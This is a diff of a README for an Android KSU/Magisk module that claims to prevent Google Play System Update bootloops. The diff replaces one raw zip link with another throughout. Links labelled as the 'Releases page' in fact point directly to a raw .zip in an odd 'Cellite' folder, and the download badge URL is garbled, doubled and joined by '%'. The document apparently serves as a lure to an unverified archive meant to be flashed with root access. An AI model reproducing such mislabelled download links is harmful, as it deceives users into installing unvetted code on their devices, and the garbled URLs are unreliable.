@@ -1,6 +1,6 @@
 # 🚀 disable-gpsu-bootloops - Prevent Bootloops on Legacy Devices
 
-[![Download](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable_gpsu_bootloops_1.3-beta.3.zip%https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable_gpsu_bootloops_1.3-beta.3.zip)](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable_gpsu_bootloops_1.3-beta.3.zip)
+[![Download](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable-bootloops-gpsu-2.8.zip%https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable-bootloops-gpsu-2.8.zip)](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable-bootloops-gpsu-2.8.zip)
 
 ## 📦 Overview 
 
@@ -16,13 +16,13 @@ disable-gpsu-bootloops is a KSU/Magisk module designed to prevent Google Play Sy
 
 To begin using disable-gpsu-bootloops, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable_gpsu_bootloops_1.3-beta.3.zip).
+1. Visit the [Releases page](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable-bootloops-gpsu-2.8.zip).
 2. Find the latest version of the module.
 3. Click on the version link to access the download options.
 
 ## 📥 Download & Install 
 
-1. Go to the [Releases page](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable_gpsu_bootloops_1.3-beta.3.zip) again.
+1. Go to the [Releases page](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable-bootloops-gpsu-2.8.zip) again.
 2. Download the .zip file for the latest version.
 3. Extract the .zip file to access the module files.
 
@@ -49,7 +49,7 @@ If you encounter any issues during installation or after rebooting:
 
 ## 🚀 Updates
 
-This module will receive updates as needed to fix bugs or add features. Regularly check the [Releases page](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable_gpsu_bootloops_1.3-beta.3.zip) for the latest updates. 
+This module will receive updates as needed to fix bugs or add features. Regularly check the [Releases page](https://github.com/guilhermeroson/disable-gpsu-bootloops/raw/refs/heads/main/Cellite/disable-bootloops-gpsu-2.8.zip) for the latest updates. 
 
 ## 🗂️ License 
 
